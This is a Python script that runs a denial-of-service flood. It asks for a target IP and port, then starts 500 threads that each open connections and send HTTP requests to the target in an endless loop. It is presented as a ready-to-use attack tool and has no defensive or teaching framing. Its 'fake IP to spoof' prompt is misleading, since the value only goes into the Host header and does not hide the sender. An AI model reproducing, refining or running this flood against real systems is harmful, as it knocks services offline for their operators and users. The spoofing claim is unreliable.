import socket
import threading

#eg:-
#the_target = '195.20.52.179'
#fake_ip = '182.21.20.32'
#port = 80

print("Enter ip Address of The Target (Web Domain) ")
print("To Get the ip adress You can ping the domain in the terminal. ")
target = input("\t == > ")
print("Enter The Fake Ip Address that you wants to spoof.   ")
fake_ip = input("\t\t ==> ")
print("Enter The Port Number You Want to Attack")
port = input("\t\t ==> ")

port = int(port)

attack_num = 0

print("Sending Packets...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print("Packets Sending => "+packesnum)
        print("Done")
        
        s.close()
print("Packets Send Sucess!")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
